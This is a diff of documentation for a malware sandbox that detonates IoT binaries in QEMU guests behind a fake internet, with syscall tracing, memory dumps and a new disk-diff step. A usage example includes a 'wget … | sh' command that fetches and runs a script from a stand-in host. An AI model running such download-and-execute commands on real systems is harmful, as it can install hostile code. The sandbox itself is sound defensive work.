@@ -36,7 +36,7 @@ MACs or 10.200.0.0/24), see [Verification](#verification).
 | `nft-sink.nft` | sbxsink | DNATs **every** TCP connection (any IP, any port) to `sink.py :9999`, every UDP DNS query to `:53`, other UDP to `:9998`, and ICMP to any address to the sink itself, so every host "is up". |
 | `dnsmasq` | sbxsink | DHCP only: gateway and DNS = 10.200.0.1. |
 | `sink.py` | sbxsink, user `sbxsink` | fake internet (below). |
-| QEMU | transient unit per run, user `sbx` | guest; `ProtectSystem=strict`, paths in `/etc/sbx/inaccessible` hidden, 1 GB / 64 tasks, rootfs `snapshot=on`. |
+| QEMU | transient unit per run, user `sbx` | guest; `ProtectSystem=strict`, paths in `/etc/sbx/inaccessible` hidden, RAM + 512 MB / 64 tasks, rootfs via a per-run qcow2 overlay. |
 
 ## The traffic sink (`sink/sink.py`, `/etc/sbx/rules.json`)
 
@@ -94,8 +94,9 @@ with `debugfs` (no mounts):
   avoids common blacklist strings, its argv avoids `ps`/`ss`/`top`, and it
   uses shell builtins only (its `sleep` is a hard link to the same copy).
 
-Guests boot with `snapshot=on`: every run starts from the pristine image and
-nothing a sample writes survives.
+Guests boot through a per-run copy-on-write overlay: every run starts from
+the pristine image, and what a sample writes to disk is diffed and then
+discarded with the run's scratch directory.
 
 **Not covered yet:** armv4l/armv5l builds are OABI (`e_flags` EABI0) and
 need a kernel with `CONFIG_OABI_COMPAT`; m68k, ppc and sh4 have no OpenWrt
@@ -139,12 +140,15 @@ sudo install -m 0644 <sample> /srv/sandbox/serve/example/b/mips
 
 ```sh
 sudo sbx-run --target mips --sample example/b/mips --duration 180
+sudo sbx-run --target mips --sample example/b/mips --name /tmp/lib/agent --args ID
 sudo sbx-run --target mips --cmd 'wget -qO- http://198.51.100.7/install.sh | sh' --duration 300
 ```
 
 `sbx-run` creates an isolated tap, starts a capture, boots the guest,
 waits for the console and the DHCP lease, starts the monitor, fetches the
-sample from the sink to `/tmp/.b`, runs it (or runs `--cmd`), watches for
+sample from the sink to `/tmp/.b` (or the `--name` path: some samples exit
+unless they carry the name and directory their dropper gives them), changes
+to its directory and runs it (or runs `--cmd`), watches for
 `--duration` seconds, stops the monitor, runs `--post` commands if the
 console shell survived (default: `dmesg | tail -60`, `/proc/net/tcp|udp`,
 `/tmp`, `/dev/shm`), then tears everything down. Output in
@@ -158,6 +162,7 @@ console shell survived (default: `dmesg | tail -60`, `/proc/net/tcp|udp`,
 | `dhcp.log` | dnsmasq lines for this guest |
 | `trace.jsonl`, `trace.status`, `gdb.log` | out-of-guest syscall trace (below) |
 | `mem-<label>.{elf,raw}.gz` | guest memory dumps (below) |
+| `fsdiff.json`, `fs-changed.tar.gz` | disk changes against the clean image, and the added/modified files (below) |
 | `run.json` | parameters, image manifest, MAC/IP, timings, sample SHA-256, tracer and dump status |
 
 Keep `--post` free of `ps`, `top`, `netstat`, `ss`, `lsof`, `strace`: some
@@ -186,7 +191,16 @@ Traced by default: `execve` (path, argv), `fork`/`vfork`/`clone` (child PID),
 `exit`/`exit_group`, `kill` (target, signal), `socket`, `connect`/`bind`
 (decoded address, result), `listen`, `sendto`, `prctl` (incl. `PR_SET_NAME`),
 `unlink`/`unlinkat`, `rename`, `chdir`, `setsid`, `reboot`, `ptrace`.
-`--trace-open` adds `open`/`openat` (noisy, slows the guest). Each event has
+`--trace-open` adds `open`/`openat` (noisy, slows the guest). `--trace-write`
+follows file changes: opens with write flags (the fd is remembered per
+process and inherited across `fork`), `write`/`writev`/`pwrite64` to those
+fds with the first 96 bytes (the first 4 writes per open; `close` has the
+write count and byte total), `close`, `dup2`/`dup3`, `creat`, `chmod`/`fchmod`/
+`fchmodat`, `mkdir`/`mkdirat`, `rmdir`, `link`/`symlink` and their `*at`
+forms, `renameat`/`renameat2`, `truncate`/`ftruncate`. Writes to sockets,
+pipes and the console are not logged (the sink and `console.log` have
+those). This is the only record of files written to the guest's `/tmp` and
+`/var`, which are tmpfs. Each event has
 the PID, TGID and process name; results are logged on the return path.
 `--no-trace` turns it off. Other guest ABIs (ARM, x86) need their own
 syscall numbers, argument registers and current-task expression; not done
@@ -198,6 +212,21 @@ seconds after detonation; `--memdump none` disables. `dump-guest-memory`
 (ELF core) is used where QEMU supports it for the target; otherwise (MIPS)
 `pmemsave` writes raw guest-physical RAM from the target's `ram_base`. A
 256 MB guest compresses to roughly 15 MB.
+
+**Disk diff (`run/sbx-fsdiff.py`, all targets).** Each run's rootfs is a
+qcow2 overlay on the clean image in the run's scratch directory. The guest
+writes dirty pages back after about 1 s instead of 30 s, and the post commands
+start with `sync`. After QEMU exits, the overlay is converted to raw, its
+ext4 journal is replayed (`e2fsck -E journal_only`), and both trees are
+extracted with `debugfs rdump` and compared by type, mode, SHA-256 and
+symlink target. A file that disappears while another with the same content
+appears is reported as a rename. Nothing is mounted on the host, and the
+disk is guest-written, so this step runs as `sbx` in a transient unit with no
+network and only its output directory writable. First-boot changes (keys,
+`uci-defaults`) are marked `"boot"` once a baseline exists for the target:
+`sudo sbx-run --target mips --cmd true --duration 30 --fs-baseline` writes
+`/srv/sandbox/images/<target>/fs-baseline.json`. `--no-fsdiff` skips the
+step.
 
 ## Verification
 
